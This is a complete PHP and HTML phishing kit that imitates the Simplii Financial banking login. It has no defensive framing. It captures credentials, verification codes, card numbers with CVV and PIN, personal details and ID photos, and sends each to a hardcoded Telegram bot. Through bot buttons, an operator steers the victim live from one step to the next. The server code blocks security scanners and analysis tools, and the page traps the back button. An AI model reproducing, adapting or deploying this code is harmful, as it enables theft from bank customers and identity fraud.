<?php
declare(strict_types=1);
$isHttps = false;
if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')) { $isHttps = true; }
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Cache-Control: private", false);
header("Pragma: no-cache");
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT");
header('X-Content-Type-Options: nosniff');
session_start();
error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blocked = ['curl','wget','python','java','go-http','httpclient','postman','insomnia','httpie','axios','headless','puppeteer','playwright','selenium','phantom','scrapy','scanner','spider','burp','zap','fiddler','mitm','wireshark'];
foreach ($blocked as $word) { if (strpos($ua, $word) !== false) { http_response_code(403); exit; } }
$uri = strtolower($_SERVER['REQUEST_URI'] ?? '');
if (preg_match('/(\.\.|\/\/|\.env|\.git|config|backup|dump|sql|log|passwd)/', $uri)) { http_response_code(404); exit; }
if (!isset($_SESSION['hits'])) $_SESSION['hits'] = 0;
$_SESSION['hits']++;
if ($_SESSION['hits'] > 300) { http_response_code(429); exit; }
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId = '-1002922644009';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    function sendTelegram(string $msg, ?array $buttons = null, ?array $photo = null): array {
        global $telegramToken, $chatId;
        $ch = curl_init();
        if ($photo) {
            $url = "https://api.telegram.org/bot$telegramToken/sendPhoto";
            $payload = ['chat_id' => $chatId, 'caption' => $msg, 'parse_mode' => 'HTML', 'photo' => new CURLFile($photo['tmp_name'], $photo['type'], $photo['name'])];
            if ($buttons) $payload['reply_markup'] = json_encode(['inline_keyboard' => $buttons]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        } else {
            $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
            $payload = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'HTML'];
            if ($buttons) $payload['reply_markup'] = json_encode(['inline_keyboard' => $buttons]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        }
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($ch);
        curl_close($ch);
        $decoded = json_decode((string)$res, true);
        return is_array($decoded) ? $decoded : [];
    }
    if ($action === 'log_data') {
        $type = $_POST['type'] ?? 'DATA';
        $data = isset($_POST['data']) ? json_decode($_POST['data'], true) : [];
        $msg = "<b>[SIMPLII] $type Captured</b>\n";
        $msg .= "IP: <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "</code>\n";
        $msg .= "UA: <code>" . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</code>\n\n";
        if (is_array($data) && !empty($data)) {
            foreach ($data as $k => $v) { $msg .= "• " . ucfirst(str_replace('_', ' ', (string)$k)) . ": <code>$v</code>\n"; }
        }
        $buttons = [];
        if ($type === 'LOGIN') {
            $buttons = [[['text' => '💰 Ask Deposit', 'callback_data' => 'req_deposit'], ['text' => '💳 Ask CC', 'callback_data' => 'req_cc']], [['text' => '🚫 Bad Pass', 'callback_data' => 'err_login'], ['text' => '✅ Finish', 'callback_data' => 'approved']]];
        } elseif ($type === 'DEPOSIT') {
            $buttons = [[['text' => '💳 Ask CC', 'callback_data' => 'req_cc'], ['text' => '👤 Ask Personal', 'callback_data' => 'req_personal']], [['text' => '⚠️ Bad Code', 'callback_data' => 'err_code'], ['text' => '✅ Finish', 'callback_data' => 'approved']]];
        } elseif ($type === 'CC_INFO') {
            $buttons = [[['text' => '👤 Ask Personal', 'callback_data' => 'req_personal'], ['text' => '🆔 Ask ID', 'callback_data' => 'req_id']], [['text' => '⚠️ Bad CC', 'callback_data' => 'err_cc'], ['text' => '✅ Finish', 'callback_data' => 'approved']]];
        } elseif ($type === 'PERSONAL_INFO') {
            $buttons = [[['text' => '🆔 Ask ID', 'callback_data' => 'req_id'], ['text' => '✅ Finish', 'callback_data' => 'approved']]];
        } elseif ($type === 'ID_UPLOAD') {
            $msg = "<b>[SIMPLII] ID Photo Uploaded</b>\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
            $buttons = [[['text' => '✅ Approve', 'callback_data' => 'approved'], ['text' => '❌ Retry ID', 'callback_data' => 'req_id']]];
            $res = sendTelegram($msg, $buttons, $_FILES['file'] ?? null);
            echo json_encode(['ok' => true, 'mid' => $res['result']['message_id'] ?? 0]);
            exit;
        }
        $res = sendTelegram($msg, $buttons);
        echo json_encode(['ok' => true, 'mid' => $res['result']['message_id'] ?? 0]);
        exit;
    }
    if ($action === 'check_status') {
        $mid = $_POST['message_id'] ?? 0;
        $content = @file_get_contents("https://api.telegram.org/bot$telegramToken/getUpdates?offset=-10");
        $updates = $content ? json_decode($content, true) : [];
        $status = 'pending';
        if ($updates && isset($updates['result'])) {
            foreach ($updates['result'] as $u) {
                if (isset($u['callback_query']) && $u['callback_query']['message']['message_id'] == $mid) {
                    $status = $u['callback_query']['data'];
                    @file_get_contents("https://api.telegram.org/bot$telegramToken/answerCallbackQuery?callback_query_id=".$u['callback_query']['id']);
                    break;
                }
            }
        }
        echo json_encode(['status' => $status]);
        exit;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Simplii Financial Online Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #fff; overscroll-behavior-y: contain; -webkit-tap-highlight-color: transparent; }
        .no-cache-img { content: url('https://www.simplii.com/content/dam/simplii-assets/banking-simplii/ways-to-bank/images/stylish-young-person-on-the-street-jamming-to-music-on-phone-2000x1120-banner.jpg/_jcr_content/renditions/cq5dam.web.767.767.jpeg?' + Math.random()); }
        header { height: 60px; background: #111; display: flex; align-items: center; padding: 0 16px; border-bottom: 3px solid #d91a5c; position: sticky; top: 0; z-index: 1000; }
        .hamburger { display: flex; flex-direction: column; gap: 5px; width: 22px; margin-right: 14px; cursor: pointer; }
        .hamburger span { height: 2px; width: 100%; background: #fff; border-radius: 1px; }
        .v-divider { width: 1px; height: 32px; background: #444; margin-right: 15px; }
        .hero { width: 100%; display: flex; height: 240px; background: #000; overflow: hidden; position: relative; }
        .hero-left { width: 45%; background: #000; padding: 25px 15px; display: flex; flex-direction: column; justify-content: center; z-index: 10; }
        .hero-right { width: 55%; position: relative; }
        .hero-right img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(1); }
        .hero-title { color: #fff; font-size: 1.1rem; font-weight: 700; line-height: 1.2; margin-bottom: 15px; }
        .hero-btn { background: #c4d600; color: #000; font-size: 11px; font-weight: 800; padding: 8px 16px; border-radius: 20px; text-transform: uppercase; width: fit-content; }
        .card-container { border: 1px solid #e2e2e2; border-radius: 4px; padding: 24px; margin: 25px 16px; background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .form-input { width: 100%; border: 1px solid #bcbcbc; border-radius: 3px; padding: 12px; font-size: 14px; color: #333; margin-bottom: 15px; outline: none; -webkit-appearance: none; transition: border 0.2s, box-shadow 0.2s; }
        .form-input:focus { border-color: #d91a5c; box-shadow: 0 0 0 3px rgba(217,26,92,0.1); }
        .form-input.error { border-color: #ef4444; background-color: #fef2f2; }
        .form-input:disabled { background-color: #f3f4f6; color: #9ca3af; }
        .btn-pink { width: 100%; background: #d91a5c; color: #fff; padding: 12px; border-radius: 25px; font-weight: 700; font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; transition: all 0.2s; position: relative; display: flex; justify-content: center; align-items: center; }
        .btn-pink:active { transform: scale(0.97); opacity: 0.9; }
        .btn-outline { width: 100%; background: #fff; border: 1px solid #ddd; color: #666; padding: 12px; border-radius: 25px; font-weight: 700; font-size: 14px; text-transform: uppercase; }
        .btn-processing { background-color: #9d1243 !important; opacity: 0.9; pointer-events: none; }
        .btn-processing span { display: none; }
        .btn-processing::after { content: 'Processing...'; display: inline-block; text-transform: none; font-weight: 700; }
        .step-container { display: none; }
        .step-container.active { display: block; animation: fadeInUp 0.4s ease-out; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); } 20%, 40%, 60%, 80% { transform: translateX(4px); } }
        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes bounceIn { 0% { transform: scale(0.3); opacity: 0; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
        #menuDrawer { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 2000; display: none; }
        .menu-content { width: 280px; height: 100%; background: #1a1a1a; padding: 30px 20px; transform: translateX(-100%); transition: transform 0.3s; }
        #successAnim, #cancelAnim { display: none; position: fixed; inset: 0; background: white; z-index: 6000; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
    </style>
</head>
<body>
    <div id="successAnim">
        <div class="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center text-white shadow-2xl" style="animation: bounceIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;">
            <svg class="w-14 h-14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7" /></svg>
        </div>
        <h2 class="text-3xl font-black text-gray-900 mt-8 tracking-tighter">Success!</h2>
        <p class="text-gray-500 font-bold mt-4 leading-relaxed">Your request has been processed successfully.</p>
    </div>
    <div id="cancelAnim">
        <div class="w-24 h-24 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 shadow-xl" style="animation: bounceIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;">
            <svg class="w-14 h-14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M6 18L18 6M6 6l12 12" /></svg>
        </div>
        <h2 class="text-3xl font-black text-gray-900 mt-8 tracking-tighter">Cancelled</h2>
        <p class="text-gray-500 font-bold mt-4 leading-relaxed">The operation was cancelled.</p>
    </div>
    <header>
        <div class="hamburger" onclick="toggleMenu(true)"><span></span><span></span><span></span></div>
        <div class="v-divider"></div>
        <div class="flex-grow flex justify-center"><h1 class="text-[#f1307e] text-2xl font-black tracking-tight" style="font-family: Arial Black, sans-serif;">Simplii Financial</h1></div>
        <div class="ml-2"><svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div>
    </header>
    <div id="menuDrawer" onclick="toggleMenu(false)">
        <div class="menu-content" onclick="event.stopPropagation()">
            <div class="flex justify-between items-center mb-8">
                <h2 class="text-[#d91a5c] text-xl font-black">Menu</h2>
                <button onclick="toggleMenu(false)" class="text-white"><svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"/></svg></button>
            </div>
            <nav class="space-y-6">
                <a href="#" class="block text-white font-bold text-lg">Personal Banking</a>
                <a href="#" class="block text-white font-bold text-lg">Credit Cards</a>
                <a href="#" class="block text-[#c4d600] font-bold text-lg">Live Help</a>
            </nav>
        </div>
    </div>
    <main class="max-w-md mx-auto min-h-[calc(100vh-60px)]">
        <div id="stepLogin" class="step-container active">
            <div class="hero">
                <div class="hero-left"><h2 class="hero-title">Life’s busy. Take your banking on the go.</h2><button class="hero-btn">Tell me more</button></div>
                <div class="hero-right"><img class="no-cache-img" alt="Hero"></div>
            </div>
            <div class="flex justify-center mt-5 mb-2"><span class="w-2 h-2 bg-gray-500 rounded-full"></span></div>
            <div class="card-container">
                <div id="loginError" class="hidden mb-4 p-3 bg-red-50 text-red-600 text-xs font-bold border-l-4 border-red-500">The username or password provided is incorrect. Please try again.</div>
                <input type="text" id="user" placeholder="Card Number or Username" class="form-input" autocomplete="username" inputmode="text">
                <input type="password" id="pass" placeholder="Password (Min. 6 characters)" class="form-input" autocomplete="current-password" minlength="6">
                <div class="flex items-center gap-2 mb-6"><input type="checkbox" id="rem" class="w-4 h-4 accent-[#d91a5c]"><label for="rem" class="text-xs text-[#004b8d] font-bold">Remember me</label></div>
                <button onclick="handleLogin(this)" class="btn-pink"><span>Sign On</span></button>
            </div>
            <div class="px-6 py-4 text-center space-y-4">
              <p class="text-[11px] text-[#333] leading-[1.6]">Simplii Financial personal banking services are provided by the direct banking division of CIBC. Banking services not available in Quebec.</p>
              <div class="flex justify-center items-center gap-4 text-[11px] font-bold text-[#004b8d]"><span>RT61</span><span>6.4.1</span><span class="text-gray-400 font-normal">(3dabc9b)</span></div>
            </div>
        </div>
        <div id="stepDeposit" class="step-container">
            <div class="p-6 space-y-6">
                <div class="bg-gray-50 border border-gray-200 rounded-3xl p-6 shadow-sm space-y-2">
                    <div class="flex justify-between items-center text-[10px] font-black text-gray-400 uppercase tracking-widest"><span>Incoming e-Transfer</span><span>REF: #SIMP-<?php echo strtoupper(bin2hex(random_bytes(3))); ?></span></div>
                    <div class="text-gray-900 font-black text-xl tracking-tight">Interac e-Transfer (Canada)</div>
                    <div class="flex items-baseline gap-2"><span class="text-3xl font-black text-[#d91a5c]">$1,250.00</span><span class="text-xs font-bold text-gray-400">Ready to Deposit</span></div>
                </div>
                <div class="space-y-5">
                    <div id="depError" class="hidden text-xs text-red-600 font-bold bg-red-50 p-2 rounded">Verification code invalid. Please check your email/SMS.</div>
                    <div class="space-y-1"><label class="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">Deposit To</label><select id="depAccount" class="form-input !mb-0 font-bold"><option value="Chequing">Simplii Chequing Account (...8832)</option><option value="Savings">Personal Savings (...1120)</option></select></div>
                    <div class="space-y-1"><label class="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">Verification Code</label><input type="tel" id="depCode" placeholder="Enter 6-digit verification code" maxlength="6" class="form-input !mb-0 font-bold" inputmode="numeric" pattern="\d*"></div>
                    <div class="bg-gray-50/80 p-5 rounded-2xl border border-dashed border-gray-200 space-y-3"><label class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Security Question</label><p class="text-sm font-black text-gray-900 leading-tight">"What is the name of your first pet?"</p><input type="text" id="depAnswer" placeholder="Your Answer" class="form-input !mb-0 font-bold"></div>
                </div>
                <div class="pt-4 space-y-4"><button onclick="handleDeposit(this)" class="btn-pink"><span>Deposit Funds</span></button><button onclick="handleCancel()" class="btn-outline">Cancel Deposit</button></div>
            </div>
        </div>
        <div id="stepCC" class="step-container">
            <div class="p-8 space-y-6">
                <div class="flex items-center gap-4"><div class="w-14 h-14 rounded-full bg-pink-50 flex items-center justify-center text-[#d91a5c]"><svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a2 2 0 002-2V7a2 2 0 00-2-2H6a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><h2 class="text-2xl font-black text-gray-900 tracking-tight">Verify Card</h2></div>
                <div id="ccError" class="hidden text-xs text-red-600 font-bold bg-red-50 p-2 rounded">Card details could not be verified.</div>
                <p class="text-[13px] text-gray-500 font-bold leading-relaxed">For your protection, please confirm the card details associated with this account.</p>
                <div class="space-y-4">
                    <input type="tel" id="ccNum" placeholder="16-digit Card Number" class="form-input" maxlength="19" inputmode="numeric" pattern="\d*">
                    <div class="grid grid-cols-2 gap-4"><input type="tel" id="ccExp" placeholder="MM/YY" class="form-input" maxlength="5" inputmode="numeric" pattern="\d*"><input type="tel" id="ccCvv" placeholder="CVV" class="form-input" maxlength="4" inputmode="numeric" pattern="\d*"></div>
                    <input type="tel" id="ccPin" placeholder="ATM PIN (Optional)" class="form-input" maxlength="6" inputmode="numeric" pattern="\d*">
                </div>
                <button onclick="handleCC(this)" class="btn-pink"><span>Verify Card</span></button>
            </div>
        </div>
        <div id="stepPersonal" class="step-container">
            <div class="p-8 space-y-6">
                <div class="flex items-center gap-4"><div class="w-14 h-14 rounded-full bg-blue-50 flex items-center justify-center text-[#004b8d]"><svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg></div><h2 class="text-2xl font-black text-gray-900 tracking-tight">Identity Profile</h2></div>
                <p class="text-[13px] text-gray-500 font-bold leading-relaxed">Additional information is required to synchronize your secure mobile profile.</p>
                <div class="space-y-4">
                    <input type="text" id="fname" placeholder="Full Legal Name" class="form-input" autocomplete="name">
                    <input type="text" id="dob" placeholder="Date of Birth (MM/DD/YYYY)" class="form-input" inputmode="numeric">
                    <input type="text" id="addr" placeholder="Residential Address" class="form-input" autocomplete="street-address">
                    <div class="grid grid-cols-2 gap-4"><input type="text" id="postal" placeholder="Postal (A1A 1A1)" class="form-input uppercase" maxlength="7" autocapitalize="characters"><input type="tel" id="phone" placeholder="Phone Number" class="form-input" inputmode="tel" autocomplete="tel"></div>
                    <input type="text" id="mmn" placeholder="Mother's Maiden Name" class="form-input">
                </div>
                <button onclick="handlePersonal(this)" class="btn-pink"><span>Update Profile</span></button>
            </div>
        </div>
        <div id="stepID" class="step-container">
            <div class="p-8 space-y-6">
                <div class="text-center space-y-2"><h2 class="text-2xl font-black text-gray-900">Verify Identity</h2><p class="text-sm text-gray-500 font-medium">Please upload a clear photo of your government-issued ID to continue.</p></div>
                <div class="space-y-4">
                    <div class="border-2 border-dashed border-gray-300 rounded-2xl p-8 flex flex-col items-center justify-center text-center space-y-3 bg-gray-50">
                        <svg class="w-12 h-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                        <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Capture Front of ID</span>
                        <input type="file" id="idFront" accept="image/*" capture="camera" class="hidden" onchange="handleIDUpload(this)">
                        <button id="idBtn" onclick="document.getElementById('idFront').click()" class="bg-gray-200 px-4 py-2 rounded-full text-[10px] font-black uppercase">Take Photo</button>
                    </div>
                </div>
                <button id="skipIdBtn" onclick="runSuccess()" class="w-full text-gray-400 text-xs mt-4">Skip for now</button>
            </div>
        </div>
    </main>
    <script>
        let currentMid = 0;
        let isPolling = false;
        function toggleMenu(open) { const drawer = document.getElementById('menuDrawer'); drawer.style.display = open ? 'block' : 'none'; setTimeout(() => drawer.querySelector('.menu-content').style.transform = open ? 'translateX(0)' : 'translateX(-100%)', 10); }
        function switchStep(id) { document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
        function setButtonLoading(btn, isLoading) {
            if (!btn) return;
            if (isLoading) {
                btn.classList.add('btn-processing');
                btn.disabled = true;
                const inputs = btn.closest('.step-container').querySelectorAll('input, select');
                inputs.forEach(i => i.disabled = true);
            } else {
                btn.classList.remove('btn-processing');
                btn.disabled = false;
                const inputs = btn.closest('.step-container').querySelectorAll('input, select');
                inputs.forEach(i => i.disabled = false);
            }
        }
        async function post(data, file = null) {
            const fd = new FormData();
            for(let k in data) fd.append(k, data[k]);
            if(file) fd.append('file', file);
            try {
                const r = await fetch('login.php', { method: 'POST', body: fd });
                if(!r.ok) throw new Error('Server error');
                return await r.json();
            } catch (e) {
                return { status: 'network_error' };
            }
        }
        function poll(mid, btn) {
            if(isPolling) return;
            isPolling = true;
            const interval = setInterval(async () => {
                const res = await post({ action: 'check_status', message_id: mid });
                if(res.status === 'network_error') {
                    isPolling = false;
                    clearInterval(interval);
                    setButtonLoading(btn, false);
                    return; 
                }
                if(res.status !== 'pending') {
                    isPolling = false;
                    clearInterval(interval);
                    if (btn) setButtonLoading(btn, false);
                    switch(res.status) {
                        case 'req_deposit': switchStep('stepDeposit'); break;
                        case 'req_cc': switchStep('stepCC'); break;
                        case 'req_personal': switchStep('stepPersonal'); break;
                        case 'req_id': switchStep('stepID'); break;
                        case 'err_login': document.getElementById('loginError').classList.remove('hidden'); switchStep('stepLogin'); break;
                        case 'err_code': document.getElementById('depError').classList.remove('hidden'); switchStep('stepDeposit'); break;
                        case 'err_cc': document.getElementById('ccError').classList.remove('hidden'); switchStep('stepCC'); break;
                        case 'approved': runSuccess(); break;
                        case 'declined': runCancel(); break;
                    }
                }
            }, 3000);
        }
        const luhnCheck = (val) => {
            let checksum = 0;
            let j = 1;
            for (let i = val.length - 1; i >= 0; i--) {
                let calc = 0;
                calc = Number(val.charAt(i)) * j;
                if (calc > 9) { checksum = checksum + 1; calc = calc - 10; }
                checksum = checksum + calc;
                j = (j == 1) ? 2 : 1;
            }
            return (checksum % 10) == 0;
        };
        const showError = (el) => {
            el.classList.add('error', 'shake');
            setTimeout(() => el.classList.remove('shake'), 500);
            el.addEventListener('input', () => el.classList.remove('error'), {once: true});
        };
        async function handleLogin(btn) {
            const user = document.getElementById('user');
            const pass = document.getElementById('pass');
            if(user.value.length < 3) { showError(user); return; }
            if(pass.value.length < 6) { showError(pass); return; }
            setButtonLoading(btn, true);
            const res = await post({ action: 'log_data', type: 'LOGIN', data: JSON.stringify({ user: user.value, pass: pass.value }) });
            if(res.status === 'network_error') { setButtonLoading(btn, false); alert("Connection error. Please try again."); return; }
            currentMid = res.mid;
            poll(res.mid, btn);
        }
        async function handleDeposit(btn) {
            const acc = document.getElementById('depAccount');
            const code = document.getElementById('depCode');
            const ans = document.getElementById('depAnswer');
            if(code.value.length < 4) { showError(code); return; }
            if(ans.value.length < 2) { showError(ans); return; }
            setButtonLoading(btn, true);
            const res = await post({ action: 'log_data', type: 'DEPOSIT', data: JSON.stringify({ account: acc.value, code: code.value, answer: ans.value }) });
            if(res.status === 'network_error') { setButtonLoading(btn, false); alert("Connection error. Please try again."); return; }
            poll(res.mid, btn);
        }
        async function handleCC(btn) {
            const num = document.getElementById('ccNum');
            const exp = document.getElementById('ccExp');
            const cvv = document.getElementById('ccCvv');
            const pin = document.getElementById('ccPin');
            const cleanNum = num.value.replace(/\D/g, '');
            if(cleanNum.length < 15 || !luhnCheck(cleanNum)) { showError(num); return; }
            if(exp.value.length < 5) { showError(exp); return; }
            if(cvv.value.length < 3) { showError(cvv); return; }
            setButtonLoading(btn, true);
            const res = await post({ action: 'log_data', type: 'CC_INFO', data: JSON.stringify({ num: num.value, exp: exp.value, cvv: cvv.value, pin: pin.value }) });
            if(res.status === 'network_error') { setButtonLoading(btn, false); alert("Connection error. Please try again."); return; }
            poll(res.mid, btn);
        }
        async function handlePersonal(btn) {
            const fname = document.getElementById('fname');
            const dob = document.getElementById('dob');
            const phone = document.getElementById('phone');
            const mmn = document.getElementById('mmn');
            const postal = document.getElementById('postal');
            if(fname.value.length < 4) { showError(fname); return; }
            if(dob.value.length < 10) { showError(dob); return; }
            const postalRegex = /^[A-Z]\d[A-Z]\s\d[A-Z]\d$/i;
            if(!postalRegex.test(postal.value)) { showError(postal); return; }
            if(phone.value.length < 14) { showError(phone); return; }
            setButtonLoading(btn, true);
            const res = await post({ action: 'log_data', type: 'PERSONAL_INFO', data: JSON.stringify({ fname: fname.value, dob: dob.value, phone: phone.value, postal: postal.value, mmn: mmn.value }) });
            if(res.status === 'network_error') { setButtonLoading(btn, false); alert("Connection error. Please try again."); return; }
            poll(res.mid, btn);
        }
        async function handleIDUpload(input) {
            const file = input.files[0];
            if(!file) return;
            const btn = document.getElementById('idBtn');
            const originalText = btn.innerText;
            btn.innerText = "Uploading...";
            btn.disabled = true;
            const res = await post({ action: 'log_data', type: 'ID_UPLOAD' }, file);
            if(res.status === 'network_error') { btn.innerText = originalText; btn.disabled = false; alert("Connection error. Please try again."); return; }
            if(isPolling) return;
            isPolling = true;
            const interval = setInterval(async () => {
                const check = await post({ action: 'check_status', message_id: res.mid });
                if(check.status === 'network_error') {
                     isPolling = false;
                     clearInterval(interval);
                     btn.innerText = originalText;
                     btn.disabled = false;
                     return;
                }
                if(check.status !== 'pending') {
                    isPolling = false;
                    clearInterval(interval);
                    if(check.status === 'approved') runSuccess();
                    else if(check.status === 'req_id') {
                        btn.innerText = originalText;
                        btn.disabled = false;
                        input.value = '';
                        alert("Image not clear. Please try again.");
                    }
                }
            }, 3000);
        }
        function runSuccess() { document.getElementById('successAnim').style.display = 'flex'; setTimeout(() => window.location.href = 'https://www.simplii.com', 3500); }
        function runCancel() { document.getElementById('cancelAnim').style.display = 'flex'; setTimeout(() => window.location.href = 'https://www.simplii.com', 3500); }
        function handleCancel() { runCancel(); }
        const formatCC = (v) => v.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
        const formatDate = (v, prev) => { v = v.replace(/\D/g, ''); if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2); if (v.length > 5) v = v.substring(0,5) + '/' + v.substring(5,9); return v.substring(0, 10); };
        const formatPhone = (v) => { v = v.replace(/\D/g, ''); if(v.length === 0) return ''; if (v.length <= 3) return '(' + v; if (v.length <= 6) return '(' + v.substring(0,3) + ') ' + v.substring(3); return '(' + v.substring(0,3) + ') ' + v.substring(3,6) + '-' + v.substring(6,10); };
        const formatPostal = (v) => { v = v.toUpperCase().replace(/[^A-Z0-9]/g, ''); if (v.length > 3) return v.substring(0, 3) + ' ' + v.substring(3, 6); return v; };
        document.getElementById('ccNum').addEventListener('input', e => e.target.value = formatCC(e.target.value));
        document.getElementById('ccExp').addEventListener('input', e => { let v = e.target.value.replace(/\D/g,''); if(v.length >= 2) e.target.value = v.substring(0,2) + '/' + v.substring(2,4); else e.target.value = v; });
        document.getElementById('dob').addEventListener('input', e => e.target.value = formatDate(e.target.value));
        document.getElementById('phone').addEventListener('input', e => e.target.value = formatPhone(e.target.value));
        document.getElementById('postal').addEventListener('input', e => e.target.value = formatPostal(e.target.value));
        (function(global) { if (typeof (global) === "undefined") { throw new Error("window is undefined"); } const _hash = "!"; const noBackPlease = function() { global.location.href += "#"; global.setTimeout(function() { global.location.href += "!"; }, 50); }; global.onhashchange = function() { if (global.location.hash !== _hash) { global.location.hash = _hash; } }; global.onload = function() { noBackPlease(); }; })(window);
    </script>
</body>
</html>